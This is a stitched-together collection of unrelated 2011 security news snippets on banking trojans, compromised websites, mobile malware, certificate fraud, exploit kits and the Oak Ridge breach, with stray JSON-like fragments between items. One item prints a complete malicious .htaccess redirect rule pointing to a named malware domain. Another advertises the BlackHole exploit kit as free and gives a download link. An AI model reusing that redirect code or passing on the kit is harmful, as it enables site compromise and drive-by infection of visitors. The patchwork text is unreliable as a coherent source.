\"The major advance in new threats has been the level of tailoring and targeting — these are not noisy, mass attacks that are easily handled by simple, signature-dependent security approaches. Targeted attacks aim to achieve a specific impact against specific enterprises, and have three major goals: Denial of service -- Disrupting business operations; Theft of service -- Obtaining use of the business product or service without paying for it; and Information compromise -- Stealing, destroying or modifying business-critical information,\" according to John Pescatore, VP Distinguished Analyst, Gartner, Inc. \"Enterprises need to focus on reducing vulnerabilities and increasing monitoring capabilities to deter or more quickly react to evolving threats, and not focus on what country the attacks are coming from. \" Organizations typically respond to these attacks with separate patches and tools for protection such as anti-DoS, intrusion prevention systems (IPS), Web application firewalls (WAF), network behavioral analysis (NBA), reputation engines, and security information and event management (SIEM) solutions. Radware AMS consolidates these multiple attack detection with mitigation technologies, such as signature detection and network and application behavioral analysis (NABA), to handle malicious application traffic through application-level challenge/response techniques. This gives security managers the ability to identify bots that imitate real user application transactions and block them in real time, avoiding the need to perform rate-based protection that would drop legitimate users along with the attack traffic. \"Nearly all IT security solutions today are designed and deployed as point solutions. That's the problem — they miss the big picture,\" said Avi Chesla, Chief Technical Officer for Radware. \"Thus they cannot make the required context-based security assessment, leaving the network exposed to today's multi-vulnerability attack campaigns. \"Most vendors only specialize as players in a primary solution – providing only WAF, IPS, DoS protection, or network behavioral analysis. Others will offer 'light' version add-ons to incorporate additional defenses. The solution we have launched offers best-of-breed technologies for all of these security modules in a holistic, integrated solution addressing the full gamut of today's evolving security threat landscape. Recent cyber attacks prove that businesses need to plan for the worst case, and that plan mandates the use of Radware's AMS solution,\" Chesla said. The ultimate impact of multi-vulnerability attacks on businesses can be staggering, resulting in fraud, defacement, identity theft, leaking of sensitive corporate information, and as seen in many cases over the past year, a complete shutdown of operations. Yet as hackers evolve in sophistication, so too must IT security managers evolve their thinking. Radware AMS can lead a transformative shift in the way the industry approaches IT security from the current, tool-based response to a holistic approach that integrates tools and strategies into a real-time, proactive, attack mitigation solution. Designed for online businesses, large enterprises, carriers, data centers and managed service providers, Radware's AMS is built on Radware's award-winning DefensePro® network security appliance, AppWall® Web application firewall and APSolute Vision® application and network security management dashboard. Radware supplements these capabilities by adding the human factor — the professional security consultants of its Emergency Response Team (ERT) who are available around the clock. As literal \"first responders\" to cyber attacks, Radware's ERT members gained their extensive experience by successfully dealing with some of the industry's most notable hacking episodes, providing the knowledge and expertise to mitigate the kind of attack a business's security team may never have handled. Global Marketing CampaignIn support of the announcement, Radware is launching its new company blog, which features expert insights on not only security, but also application delivery, mobile data, virtualization, service provider issues and a host of other IT topics. The company is also running a global marketing and advertising campaign to educate end users on how they need to be fully equipped to overcome today's multi-vulnerability attacks and take an offensive posture. The campaign features a Flash game and contest designed to provide players with a fun way to learn about Radware's Attack Mitigation System capabilities while they understand how to cost-effectively neutralize today's distributed attacks. The game, \"Radware AMS Threat Race\", runs until mid-October and offers contestants the opportunity to win $5,000. For more information and game access, please visit: http://www.radware.com/ams.

W32/SpyEye Aliases : This is a list of aliases for the variant of SpyEye discovered in early February 2011 that has been actively targeting Norwegian banking websites: Trojan-Spy.Win32.SpyEyes.evg (Kaspersky) PWS-Spyeye.m (McAfee) Trojan:Win32/EyeStye.H (Microsoft) A variant of Win32/Spy.SpyEye.CA (NOD32) W32/Malware.QOOC (Norman) Trojan.Zbot (Symantec) Mal_Xed-24 (Trend Micro) Brief overview SpyEye is a trojan with backdoor capabilities that attempts to steal sensitive information related to online banking and credit card transactions from an infected machine. SpyEye is sold via its author in an easy to configure kit form, which contains the trojan executable itself, command and control (C&C) server and basic configuration for targeting banking websites. As of the beginning of 2011, SpyEye has merged functionality from the ZeuS trojan family, which has been sold to the SpyEye author, and is now becoming more sophisticated with respect to the features and functionality offered. SpyEye can potentially utilise a number of techniques in order to obtain a users online banking credentials, typically employing a phishing-style attack by presenting a faked logon web page, which is usually based on the original logon page from the bank, but that has additional HTML form fields and JavaScript inserted within, in order to obtain logon credentials that are not normally part of the logon process, such as PIN/TAN codes. A copy of the HTTP POST request is sent to the SpyEye C&C server, from which an attacker can extract the banking credentials or credit card details, and start conducting their own fraudulent transactions.

A Russian cybergang headed by a mysterious ringleader called ‘Soldier’ were able to steal $3.2 million (£2 million) from US citizens earlier this year using the SpyEye-Zeus data-stealing Trojan, security company Trend Micro has reported and Trusteer reports that an Android variant of Spitmo (SpyEye for mobile) has been discovered. The methodology sounds familiar for those familiar with ZeuS Mitmo and SpyEye Spitmo: infected computers inject a message into targeted netbanks prompting their customers to install software on their phones. Once Spitmo is installed, the SpyEye attacker is able to monitor incoming SMS and to steal MTAN authentication messages. \"His botnet was able to compromise approximately 25,394 systems between April 19, 2011 and June 29, 2011. And while nearly all of the victims were located in the US, there were a handful of victims spread across another 90 countries,\" it said in a blog post. Over a six month period from January 2011, Trend found that the Soldier gang had been able to compromise a cross-section of US business, including banks, airports, research institutions and even the US military and Government, as well as ordinary citizens.A total of 25,394 systems were infected between 19 April and 29 June alone, 57 percent of which were Windows XP systems with even Windows 7 registering 4,500 victim systems. “Compromise on such a mass scale is not that unusual for criminals using toolkits like SpyEye, but the amounts stolen and the number of large organizations potentially impacted is cause for serious concern.”Victims included: US Government (Local, State Federal) US Military Educational & Research Institutions Banks Airports Other Companies (Automobile, Media, Technology) C&C Infrastructure Banking Trojans such as SpyEye and the older Zeus (possibly now merged with SpyEye) have been one of the malware stories of the last year, and have featured in a number of high-profile online crime cases. Zeus for Android purports to be a version of Trusteer Rapport security software. This social engineering trick is used in an attempt to convince the user that the application they are installing is legitimate.SpyEye for Android, now detected by Sophos products as Andr/Spitmo-A, uses a slightly different but similar social engineering technique. Spitmo was initially detected by F-Secure in April when a variant was used in an attack against a European bank - the Trojan added question fields to the bank's website, asking customers to enter their mobile phone number and the device's IMEI.Sean Sullivan, security advisor at F-Secure, said: “Spitmo.A contains the malicious executable (sms.exe) and another installer, which contains an executable named SmsControl.exe. SmsControl.exe will just display the message ‘Die Seriennummer des Zertifikats: Ü88689-1299F' to fool the user into thinking that the installer was indeed a certificate.“The name SmsControl.exe is quite a coincidence, as a variant of ZeusMitmo used the same name for the file containing the Trojan. Faking the Trojan to be a certificate is also a trick that ZeusMitmo has used. However, the code itself looks completely different than in ZeusMitmo.”" }

These redirections attacks are very common on outdated WordPress and Joomla sites, but this time (and for this specific malicious domain), we are only seeing them on GoDaddy hosted sites. So it looks like a compromise on their own servers (similar to what has happened in the past). This is caused by this entry that is added to the .htaccess file of the compromised sites: RewriteEngine On RewriteOptions inherit RewriteCond %{HTTP_REFERER} .*ask.com.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*msn.com*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*bing.com*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*live.com*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*aol.com*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*altavista.com*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*excite.com*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*search.yahoo*$ [NC] RewriteRule .* http://sokoloperkovuskeci.com/in.php?g=916 [R,L] The malware checks if anyone visiting the infected site is coming from a Google search (or Yahoo, or Bing) and if they are, redirects them to that domain (sokoloperkovuskeci.com). In there, the user gets redirected again to other locations to get their browsers infected too. So you have to fix your site asap to protect your own users. GoDaddy says they are working with customers to resolve the issue, but if you have a GoDaddy account you should check on this, minimally by Googling for your site and following the link (only if your browser is all patched up and you have sufficient other protections).DomainNameWire also smartly recommends that you check with Google, other search engines and security companies to make sure you haven't been blacklisted." }

The site reported on its blog that the attack had occurred at around 04:20 Pacific Daylight Time (11:20 GMT) on Tuesday. Initially, the incursion was also thought to have affected the servers of the main BitTorrent site, but further investigation revealed this site had been unaffected by the attack. Once installed, Security Shield delivers false reports that a computer is infected with multiple pieces of malware and prompts the user for payment before claiming to disinfect the machine. The attack affected only users who downloaded and installed software from bittorrent.com and utorrent.com during the hour-and-fifty-minute window that the sites were compromised. Those who installed software previously are unaffected. \"We have completed preliminary testing of the malware. Upon installation, a program called ‘Security Shield\" launches and pops up warnings that a virus has been detected.

What’s worse than discovering that someone has launched a man-in-the-middle attack against Iranian Google users, silently intercepting everything from email to search results and possibly putting Iranian activists in danger? Discovering that this attack has been active for two months. \"This is a wildcard for any of the Google domains,\" said Roel Schouwenberg, senior malware researcher with Kaspersky Lab, in an email interview Monday. \"[Attackers] could poison DNS, present their site with the fake cert and bingo, they have the user's credentials,\" said Andrew Storms, director of security operations at nCircle Security. As the problems with the certificate authority system become clear, lots of people are working on ways to detect and mitigate these attacks. Chrome's pinning feature is available not only to Google web sites but to any webmaster; if you run an HTTPS site, you can contact the Chrome developers and get your site's keys hard-coded. Other browser vendors may implement a similar feature soon. The same result could also be achieved by giving web sites themselves a way to tell browsers what certificates to anticipate—and efforts to do this are now underway, building on top of DNSSEC or HSTS. Then browsers could simply not believe conflicting information, or at least provide a meaningful way to report it or warn the user about the situation. Mozilla has announced the release of new versions of their browser, mail client and Internet suite in which trust of DigiNotar's root certificate will be revoked." }

Since week ago some Egyptian hackers attacked so many Israeli's gov communities and organizations on the internet. Israeli prime minister Netanyahus for example. But yet it wasn't very scary attacks level , as it was far from the normal computer users. In Sudden escalation for the attack level , an Egyptian group launched computer worm which infected about 50000 personal computer in Israel and united states. Despite of my virtual machine security level , it was also infected by the same worm. I (Reuben Rayner) didn't notice that am infected till the attackers launched an exe file which viewed message in the full screen mode. Quits of the attackers message they started with the word \"Anti-Zionism\" \"If u can see this message this mean that u either from israel orfrom USA > both sucks your stupid zionist soliders passed through the Egyptian borders and killed 3 soldiers and that's not good for u. now our army became 79999997 instead of 80000000 , they all ready to kick ur fat asses :)\" it seem that it also about the border problem between Egypt and Israel \"our strike is just the beginning , u can say it's a simple bullet , but the nuclear strike is comming soon :) this is not your only fate , so don't be sad , this fate is waiting thousands of zionist users watch this pic : http://adf.ly/2R8A1\" Threatening that they are more attacks against Zionists and attaching a picture of their own bot network. \"Striked By : sTrIk3r, i-Hmx , H311 C0D3 & K4rar shouts to all elite hackers at sec4ever.com , alm3refh.com and 1337s.cc now let Our Worm talk to u about herself for seconds . . .\" Names and Arabic sites and yet they seem to be funny enough to let them worm talk to the user > me you can read the full message via the picture above, but what make this attack unique?? Ok , have you viewed Israel gov sites yesterday? Try pinging mossad.gov.il for example The pinging result C:\\>ping mossad.gov.il -ttl Pinging mossad.gov.il [147.237.72.71] with 32 bytes of data: Request timed out. Request timed out. Request timed out. Request timed out. Request timed out. Request timed out. Request timed out. Request timed out. Request timed out. Request timed out. Request timed out. What's the point?? If the attackers used the same massive bots to attack sensitive gov sites , this will probably cause a disaster. If they did it and dumped the banking accounts of thousands and thousands of users they got , this will also cause disaster. Little analysis for the worm I (Reuben Rayner) am trying to get a copy of this worm now to give detailed analysis but it's using a unique technique to attack spread over computers - usb spread. - inject itself within executable files - injecting malicious html codes through out user's pc - it's always trying to use the fake msn account in my virtual machine to send malicious links - sending the antivirus update requests to fake server addresses so you will always think that ur AV is updated , but actually it isn't. - disabling firewall software > comodo in my vpc other techniques still unknown to me While surfing through internet I (Reuben Rayner) found some topics asking for help about that worm. All asking the same question , what should I (Reuben Rayner) do? You have to format your C drive and re-install windows. Once installation is finished don't open any exe file , juts copy firewall software from the internet. Install it and block any request from exe files to modify registry or connecting to internet. Download Avira , install it and update it now it's able to detect this malware. Scan your computer and remove any infected file , now you are safe :) Submitted By : Reuben Rayner Email : reuben_r@rocketmail.com" }

Further to this, a malicious piece of malware has been discovered for devices powered by Android 2.3.3 Gingerbread, giving the hacker the ability to take complete control of the smartphone remotely. According to Assistant Professor Xuxian Jiang from the NCSU Department of Computer Science, the new threat, which his team has dubbed GingerMaster, is the first malware to use the root exploit for Android 2.3. \"As this is the first time such malware has been identified, it is not surprising when our experiments show that it can successfully evade the detection of all tested (leading) mobile anti-virus software,\" he writes. Once the GingerMaster malware is installed and has root privileges, it then reaches out to a remote command-and-control server and asks for instructions. It then has the ability to download and install apps on its own, without the user's permission, Jiang found. GingerMaster is an evolution of the existing DroidKungFu malware, which had some of the same functionality. Earlier this week, Jiang's team also found other variants of DroidKungFu in several dozen infected apps in alternate Android app stores. That version included a couple of root exploits as well, but for earlier versions of Android. As far as we can tell, no “official” applications being offered through Android Market have been affected by GingerMaster, but it’s best to err on the side of caution when it comes to these things. Recognize that your Android smartphone is very much a computer and, as such, is just as vulnerable to attacks as your home PC. The researchers recommend that users take several steps to protect themselves. The first one is to run a mobile antivirus product. There are several free solutions available from vendors like Lookout, AVG, BitDefender or Symantec.Then, users should only download apps from trusted marketplaces, like the official Android Market. Unfortunately, there is no assurances that malware won't slip through the cracks and appear on these services from time to time, but the chances are lower than in other places.Finally, users should make a habit from reading and understanding the permissions requested by apps on installation. Trojanized apps will usually require permissions that legit versions wouldn't need." }

TED is a nonprofit organization dedicated to \"Ideas worth spreading,\" which it distributes on its website. In the real world, you only have to worry about the criminals who live in your city. But in the online world, you have to worry about criminals who could be on the other side of the planet. Online crime is always international because the Internet has no borders. Today computer viruses and other malicious software are no longer written by hobbyist hackers seeking fame and glory among their peers, but by professional criminals who are making millions with their attacks. These criminals want access to your computer, your Paypal passwords and your credit card numbers. Criminal online gangs recruit people with high level computing skills but no job opportunities in the real-world economy. There is now a global market for sinister crimeware -- viruses, worms, trojans, spyware -- that is produced and sold on underground market sites on the Web. The international community has failed to address the real nature and extent of the problem. National police forces and legal systems are finding it extremely difficult to keep up with the rapid growth of online crime. They have limited resources and expertise to investigate online criminal activity. The victims, police, prosecutors and judges rarely uncover the full scope of the crimes that often take place across international boundaries. Action against the criminals is too slow, the arrests are few and far between, and too often the penalties are very light, especially compared with those attached to real-world crimes. We are sending the wrong message to the criminals and that's why online crime is growing so fast. Right now would-be online criminals can see that the likelihood of their getting caught and punished is vanishingly small, yet the profits are great. If a gunman walks into a bank and demands cash, the police are ready to leap into action. If international borders are crossed during such a crime, the international police agencies become involved. If the gunman is caught, there is always a trial and the bank will push the prosecutor for the maximum penalties possible. This is not the case with online crime. Virtual gunmen are free to roam with almost nobody to stop them. Online crime is always international but local police authorities usually only have their local resources to conduct the investigation. Online crime is easier to carry out than \"offline\" crime and costs less to get started. Computer security companies are doing their best to protect their customers' computers but little can be done directly by non-governmental organizations to fight the criminals at the heart of the matter. Anti-virus companies are not law enforcement, nor should they be. Tackling online crime requires a serious investment of resources on the international level and expert law enforcement agencies need to follow criminals into the online world. Traditionally, international law enforcement has focused on large international crimes such as drug trafficking or smuggling. Countries involved in investigations like these can easily see the value of catching such criminals. However, online crime is typically composed of small individual crimes. The attackers don't hack the bank, they hack the bank's customers. One victim might have only lost few hundred dollars from his bank account. Starting an international investigation looks like an overkill and thus getting international cooperation might be difficult. The problem is, of course, that there is more than one victim. A banking trojan botnet might steal money from tens of thousands of people at the same time. What we need is an international police force with the enforcement power to really target the organized crime that operates on the net. It would investigate the top of the crimeware food chain and track down the people who are running the online crime syndicates. Each member country would be required to co-operate with others, regardless of the apparent size of the crime. Of course, establishing such a new force would mean a number of legal challenges. For example, malicious code is often created in countries where it is not even illegal or where the perpetrators are not prosecuted. In my opinion, such an agency should focus only on fighting international malware crime gangs. If it would try to extend to other areas, such as fighting pirates or hactivists, things would get much more complicated. Nobody wants banking trojan gangs around, and we should focus on this problem. The last thing I'd want is some sort of a net police that would try to restrict the freedom of the net. This very freedom is the reason Internet has become as useful as it is. But we need to take action now. If we don't, online crime will continue to grow stronger and we might risk losing all the great benefits the net has brought to us. Our generation is the first generation that got online. We should make sure this resource will stay around for future generations. Article [Source] and Video [Source]" }

Reuters post the news about Hacking of Oracle and some more big Companies just by using Social Engineering in DefCon 19. Hackers taking part in the competition on Friday and Saturday found it ridiculously easy in some cases to trick employees at some of the largest U.S. companies to reveal information that can be used in planning cyber attacks against them. A contestant pretended to work for a company's IT department and persuaded an employee to give him information on the configuration of her PC, data that could help a hacker decide what type of malware would work best in an attack. \"For me it was a scary call because she was so willing to comply,\" said Chris Hadnagy, one of the organizers of the contest at the Defcon conference in Las Vegas. \"A lot of this could facilitate serious attacks if used by the right people,\" Hadnagy said. The company whose employees handed over the most data was Oracle Corp, according to Hadnagy. One of the world's largest software makers, Oracle got its start more than 30 years ago by selling secure databases to the Central Intelligence Agency. Oracle spokeswoman Deborah Hellinger declined comment. Other targets included Apple Inc, AT&T Inc, ConAgra Foods Inc, Delta Air Lines Inc, Symantec Corp, Sysco Corp, United Continental Holdings Inc's United Airlines and Verizon Communications Inc. It was the second year that Defcon held a contest in \"Social engineering,\" or the practice where hackers con people into handing over information or taking actions such as downloading malicious software. \"It's better whenever you can get data non-confrontationally,\" said Johnny Long, a consultant who companies hire to hack into their data networks, using tools such as social engineering, to identify weaknesses.

The trojan is triggered when the Android device places or receives a phone call. It saves the audio file and related information to the phone's microSD card, and includes a configuration file with information on a remote server and settings used by the trojan. The malware also \"drops a 'configuration' file that contains key information about the remote server and the parameters,\" CA security researcher Dinesh Venkatesan writes in a blog, perhaps suggesting that the recorded calls can be uploaded to a server maintained by an attacker. According to the post, the trojan presents itself as an \"Android System Message\" that requires users to press an \"Install\" button for it to insert itself in the phone. Once installed, the trojan records all incoming and outgoing calls to a directory on the microSD card as .amr files, as well as information about the call, including its duration, in a text file. Venkatesan tested the Trojan in \"a controlled environment with two mobile emulators running along with simulated Internet services,\" and posted screenshots with the results. It appears the Trojan can only be installed if the Android device owner clicks the \"install\" button on a message that looks strikingly similar to the installation screens of legitimate applications. \"As it is already widely acknowledged that this year is the year of mobile malware, we advice the smartphone users to be more logical and exercise the basic security principles while surfing and installing any applications,\" Venkatesan writes." }

If the documents released by Anonymous Hackers are to be believed, the Italian cyber police - National Anti-Crime Computer Centre for Critical Infrastructure Protection (CNAIPIC) - was widely hacking Indian embassy's letters with Russian defence firms. Leaked Data which include the letters between the Indian embassy's Air Wing and a local company supplying spares for military aircraft. Izvestia said Italian cyber police had hacked on June 22, 2010 Deputy Air Attache D S Shekhavat's correspondence with Aviazapchast, a company specialising in the supply of aviation spares, complaining about delays in the shipment of 15 helicopter engines. A reply from the Aviazapchast representative in India written on the same day was also hacked by the CNAIPIC. The Italian cyber police had also accessed correspondence of the aircraft engine manufacturer NPO Saturn and Ilyushin Aircraft with the Indian embassy in Moscow and the Air Headquarters in New Delhi. Indian embassy's Counsellor Information Nutan Kapur Mahawar had no comments to offer on the report. The files put online reveal that besides the Indo- Russian defence cooperation the CNAIPIC widely targeted correspondence of Russian nuclear and hydrocarbon majors like 'Atomstroieksport' and 'Gazprom', Izvestia reported. The Aviazapchast spokesman told the daily that there was no leakages from the company and the letters had been stolen from the Indians. Izvestia was inclined to believe in this as Indian embassy cellphone bills from local Beeline provider that were among the hacked documents accessed by it including the bill dated February 28, 2011, containing a printout of all telephone numbers called or SMSed by the Indian embassy staff. Although from the report it was evident that Russian energy majors and not Indian embassy were the prime targets of the economic intelligence by the Italians, including on the construction of Bushehr nuclear power plant in Iran, but in the past the Indian mission here has been the target of cyber attack. In April 2010, the Indian Embassy here has boosted its cyber security in the wake of a report about alleged Chinese cyber espionage by infecting scores of Indian government and defence related sites by malwares to steal the confidential information. Then the US and Canada based Information Warfare Monitor and Shadowservers Foundation in their report 'Shadows in the Cloud' had traced China's Chengdu based servers of exfiltering sensitive information from the Indian computers, including Indian missions in Moscow, London and Washington. Commenting on the report, a section of Russia media had raised concerns about sensitive and secret information about Moscow and New Delhi's defence cooperation falling into the Chinese hands. At that time the Indian embassy here confirmed that at least two attacks were traced to Chinese servers, but denied leakage of any confidential information. Source" }

Today he has come up with a very interesting way to hack the MacBook using the battery. Laptop battery contains its own monitoring circuit which reports the status of the battery to the OS. It also ensure that the battery does not overcharge even when the laptop is turned off. Miller has discovered that on the MacBooks, the batteries are shipped with the default password set on the chips. It means that if someone knows the default password, the firmware of the battery can be controlled to do many things from simply ruining the battery to installing a malware which reinstalls whenever the OS boots. Miller said that it might even be possible to overload the battery so that it catches fire. This is what Miller said: These batteries just aren’t designed with the idea that people will mess with them. What I’m showing is that it’s possible to use them to do something really bad. You could put a whole hard drive in, reinstall the software, flash the BIOS, and every time it would reattack and screw you over. There would be no way to eradicate or detect it other than removing the battery. This is a very real threat but such an attack is not likely to occur anytime soon. To successfully carry out the attack, the attacker has to analyze the 2009 software updates from Apple for the password, like Miller has done. If he is able to retrieve the password, he will have to find a vulnerability in the interface between the OS and the firmware. Miller believes that this will not be a difficult job as Apple probably never expected such kind of attack. Miller will present his findings at the BlackHat security conference next month. At the conference, he also plans to release a tool which will change the password of the battery to a random string." }

The report is presented by researchers from security firm Kaspersky Lab. TDSS also known as ‘TDL’ and sometimes by its infamous rootkit component, Alureon. It has grown into a multi-faceted malware nexus spinning out ever more complex and dangerous elements as it evolves. Kaspersky Lab researchers were able to penetrate three SQL-based command and control (C&C) servers used to control the activities of the malware’s latest version, TDL-4, where they discovered the IP addresses of 4.5 million IP PCs infected by the malware in 2011 alone. Almost 1.5 million of these were in the US.If active, this number of compromised computers could make it one of the largest botnets in the world, with the US portion alone worth an estimated $250,000 (£155,000) to the underground economy. The researchers noticed a kad.dll component of the infection which appears to allow TDSS/TDL-4 an elaborate C&C channel to control bots using the Kad P2P file exchange network even if the primary encrypted channel has been shut down by rival botnetters or security companies. “We don’t doubt that the development of TDSS will continue,” said Kaspersky researcher, Sergey Golovanov, who performed the latest analysis of TDSS. “Active reworkings of TDL-4 code, rootkits for 64-bit systems, the use of P2P technologies, proprietary anti-virus and much more make the TDSS malicious program one of the most technologically developed and most difficult to analyse.”" }

Now Google has added another announcement to the pile that hundreds of Gmail accounts have been hacked recently. Now, Google affirms that the problem doesn’t rest with Gmail security but rather this scheme was a result of phishing and malware. Google spilled the details on Wednesday via its official blog: Through the strength of our cloud-based security and abuse detection systems*, we recently uncovered a campaign to collect user passwords, likely through phishing. This campaign, which appears to originate from Jinan, China, affected what seem to be the personal Gmail accounts of hundreds of users including, among others, senior U.S. government officials, Chinese political activists, officials in several Asian countries (predominantly South Korea), military personnel and journalists. The goal of this effort seems to have been to monitor the contents of these users’ emails, with the perpetrators apparently using stolen passwords to change peoples’ forwarding and delegation settings. Gmail users affected by this security mishap should have already been notified. Google’s security team outlined a number of steps that Gmail users can take to protect themselves, which should only take about “ten minutes.” Google recommended the following: Use two-factor authentication; Choose a strong password; Watch for suspicious activity warnings in your Gmail account; Check your settings for odd forwarding." }

First Public Release of BlackHole Exploit Kit. BlackHole exploit kit is yet another in an ongoing wave of attack toolkits flooding the underground market. The kit first appeared on the crimeware market in September of 2010 and ever since then has quickly been gaining market share over its vast number of competitors. In fact, many antivirus vendors now claim that this is one of the most prevalent exploit kits used in the wild. Even Malware Domain List is showing quite a few domains infected with the BlackHole exploit kit. Black Market Cost : Users can purchase the annual license for $1500, semi-annual license for $1000, or just a quarterly license for $700. The license includes free software updates for the duration of the contract. For those malicious users with a commitment phobia the makers of the kit offer yet another solution. You can rent the kit (on the author’s servers) for $50 for 24 hours, $200 for 1 week, $300 for 2 weeks, $400 for 3 week, and $500 for 4 weeks. A domain name comes included with the rental agreement, but should you desire to change it you need to pay another $35. But Now its FREE HERE ! Feature : One highly touted feature of BlackHole toolkit is its TDS or Traffic Direction Script. While this is not an entirely new concept in attack toolkits the TDS included her is much more sophisticated and powerful than those in other kits. A TDS is basically an engine that allows redirection of traffic through a set of rules. For example, a user can set up a set of rules that redirect flow to different landing pages on their domain. These rules could be based on operating system, browser, country of origin, exploit, files, etc. One rule might redirect traffic to page A for all users that are running Windows OS from XP to Vista and running IE 8, while another rule can redirect Windows 7 users to page B. Those were just simple example rules. More advanced rules could set expiration dates for certain payloads and replace them with new ones when the date is reached. The TDS included in BlackHole even goes the extra step and allows you to create traffic flows based on these rules and provides management interface for the flows. A savvy malicious user with a lot of experience could easily utilize this rule engine to increase their infection numbers.From a web application standpoint BlackHole is built just like other kits, consisting of a PHP and MySQL backend. Since the majority of web servers run on the LAMP stack this enabled for very easy application deployment. The user interface for this kit is a cut about the rest, and it definitely looks nicer than almost any other attack kit we’ve analyzed. It resembles some of the best legitimate web apps we see in the world of commercial software. Download Link : http://www.multiupload.com/ZTZPEA9L5Y Other Exploit Kits Public Release : 1.)

Security researchers from cloud security provider Zscaler warn that technology website geek.com was compromised and many of its pages are executing drive-by download attacks against visitors. Geek.com is one of the oldest technology news websites around, dating back to 1996, the dawn of the commercial World Wide Web. Attackers have managed to inject rogue IFrames into different portions of the site, both within articles and the site's main pages like home, about us, etc. According to Umesh Wanve, a senior security research engineer at Zscaler, there are multiple infections and the iframes take visitors to different malicious websites. One example is the rogue code injected into a May 13 article about Call of Duty: Modern Warfare 3 details being leaked, which redirects visitors to an exploit kit. These kits perform various checks to determine what versions of certain program users have installed on their computers and then serve exploits for vulnerabilities in those products. The most commonly used applications like Java Runtime Environment, Flash Player, Adobe Reader or the browser itself are usually targeted. \"As this is first article is highlighted and 'Call of Duty' is a very popular game, one can assume that many people have fallen victim to this attack,\" Mr. Wanve says. Drive-by download attacks are currently one of the main malware distribution channels on the Internet. They are very dangerous because in most cases they are completely transparent to victims. \"Unfortunately, we see hundreds of attacks such as this each and every day. Many legitimate websites are being compromised by taking advantages of poor coding practices in web applications,\" the Zscaler security researcher says. Users can protect themselves by keeping all of they software up to date, including the operating system itself, and running antivirus products capable of scanning web traffic. Mozilla Firefox users can also use advanced extensions such as NoScript. Source" }

Part 1: Java Exploit As stated above, I focus on a malware that exploits a recent JRE vulnerability: CVE-2010-0840 to execute malicious files on a victim system. This malware comes inside a jar file, which contains the following two classes: Crimepack.class and KAVS.class. Part 1.1: Crimepack.class This class is the engine of the malware, it is obfuscated, but you can quickly strip off the obfuscation (my python beta tool is great…), once you get rid of the obfuscation you can see the following code: As always, we have an Applet that access to the data parameter, generates a random name for the exe payload that will be dropped in the system temp directory and then executed. So at this point as you can see we have nothing new, the above is a common Java downloader… but let’s scroll down: Above, we can see that the malware is creating a new instance of the KAVS class (description follows), in order to trigger the JRE vulnerability by using a call to the getValue() method (..snipped above..). Part 1.2: KAVS.class Here is the hand-crafted class, I say hand-crafted because such class cannot be compiled by using a standard compiler, so you have to edit the compiled class by editing the bytecode: Part 2: PDF-generator on demand The kit contains a nice php script that drops custom pdf on-demand, which means that you can have several mutations of the same piece of malware, by simply connecting to a malicious link.

The Oak Ridge National Laboratory - located in Tennessee and funded by the U.S. Department of Energy - is known for performing classified and unclassified research for federal agencies and departments on issues crucial for national security. Among other things, the lab also does cybersecurity research on malware, vulnerabilities and phishing. It is somewhat ironic, then, that the breach was the result of two employees falling for a malicious email containing a link to a page that exploited a remote-code execution vulnerability in the Internet Explorer browser. According to Wired, the email was sent to about 530 lab employees, of which 57 believed that the email was coming from the institution's human resources department and clicked on the link. Of those 57 machines, only two got infected. It seems that the malware inserted in those two computers lay dormant for a week, and then started to send out stolen data from one of them to a remote server. This was discovered by the administrators who immediately shut down and cleaned up the machine, but a week later, they discovered that other servers were also infected - hence, the total shutdown of Internet access. Thomas Zacharia, the deputy director of the lab, didn't say what data had been stolen, but he confirmed it was encrypted. He hopes that the investigation will reveal the nature of the data and the destination of the stolen batch. He also commented that the malware used in the attack was designed to hide on the system and to delete itself if it was unsuccessful on a particular system. According to a New York Times article, the Oak Ridge National Laboratory was used to test and reveal the vulnerabilities that allowed the Stuxnet worm to target the Natanz nuclear plant. This claim being now in the open, it is easy to see how speculations about the origin of the attack that hit the lab's network are inevitably going to lean towards Iran." }

The Department of Justice and FBI declared that it has cracked a network of hackers, who have infected almost 2 million computers with a harmful \"bot\" program, Coreflood that steals private and monetary data from computers. Identified as a \"bot\" network- as the malware can be managed distantly like a robot- it compromises machines with a software program called Coreflood, which downloads itself by finding out the vulnerability in systems, that are running Windows operating systems. The legal actions are the key components of the \"most complete and inclusive enforcement action ever taken by the U.S. authorities to put out of action an international botnet\", as per the statement from the Department of Justice, reports cnet News on April 13, 2011. As per a request from a temporary restraining order that was granted, it's the first time USA law enforcement has taken consent from a court for controlling a botnet. This malware (Coreflood) stores keystrokes and personal communications, making it enable to compromise login details, like passwords, and other personal and monetary data. Once a system is compromised with Coreflood, the malware contacts a command-and-control server, allowing it to distantly control the compromised machine. The government replaced the unauthentic command and control servers with substitute servers to prevent Coreflood from being used for any more harmful activity. U.S. Attorney David B. Fein for the District of Connecticut stated that the seizure of the Coreflood servers and Internet domain names can stop hackers from using Coreflood or systems infected by Coreflood for their evil purpose. He stated that he wished that his industry partners to work in cognition with the law enforcement in order to attain this great result, as per the news by CRN on April 13, 2011. But, it is impossible to know exactly the number of victims claimed by Coreflood, as machines are continuously being infected, disinfected and sometimes reinfected. While investigators estimated 413, 710 infected machines from March 2009 to January 2010, the total number of machines those were, or had been, part of Coreflood is more than 2.3 million, with almost 1.8 million seems to be located in the USA." }

The lab is an energy department laboratory that studies nuclear fusion, supercomputing, and other areas. Ironically, \"one of the core competencies of the lab is cybersecurity research,\" according to a quote on Wired. The attack prompted a shutdown of e-mail and Internet access at the facility. The attack vector used to break into Oak Ridge's network is known as an advanced persistent threat, or APT. Nextgov describes it thus: \"APTs typically infiltrate a target by e-mailing its employees messages purportedly from legitimate associates that ask the employee to submit personal information, such as passwords, and then harvest this information to access the systems they are after. Once inside the network, the perpetrators often try to extract data -- perhaps proprietary designs or classified information.\" Wired provides more details of the attack: According to Zacharia, the intrusion came in the form of a spear-phishing email sent to lab employees on April 7. The e-mail, purportedly sent from the human resources department, discussed employee benefits and included a link to a malicious web page, where malware exploited the IE vulnerability to download additional code to users’ machines. The attackers cast their net wide in the company, but hooked only two computers in the phishing scheme, Zacharia said. About 530 employees received the e-mail — out of about 5,000 workers — but only 57 people clicked on the malicious link in the correspondence. Out of this, only two machines got infected with the malware. The lab began to block the malicious emails soon after they began coming 